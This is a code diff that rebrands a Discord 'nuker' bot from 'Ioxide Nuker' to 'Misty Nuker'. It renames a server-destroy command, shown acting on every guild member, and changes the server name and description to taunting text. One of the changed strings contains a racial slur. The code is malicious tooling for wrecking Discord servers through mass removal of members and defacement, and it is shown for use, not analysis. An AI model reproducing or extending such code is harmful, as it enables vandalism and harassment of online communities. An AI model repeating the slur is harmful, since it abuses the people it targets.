@@ -171,10 +171,10 @@ async def on_connect():
         antiafk = "Disabled"
 
     startprint()
-    ctypes.windll.kernel32.SetConsoleTitleW(f'[ Ioxide Nuker v{ServerNuker.__version__} ] | Logged in as {Ioxide.user.name}')
+    ctypes.windll.kernel32.SetConsoleTitleW(f'[ Misty Nuker v{ServerNuker.__version__} ] | Logged in as {Ioxide.user.name}')
 
 @Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
-async def destroy(ctx):
+async def Fog(ctx):
     await ctx.message.delete()
     for user in list(ctx.guild.members):
         try:
@@ -193,9 +193,9 @@ async def destroy(ctx):
             pass
     try:
         await ctx.guild.edit(
-            name="IOXIDEW",
-            description="get fucked by ioxide LOL",
-            reason="cuz ioxideW nigga",
+            name="Misty Got Youu",
+            description="get fucked by Misty LOL",
+            reason="cuz MistyW nigga",
             icon=None,
             banner=None
         )
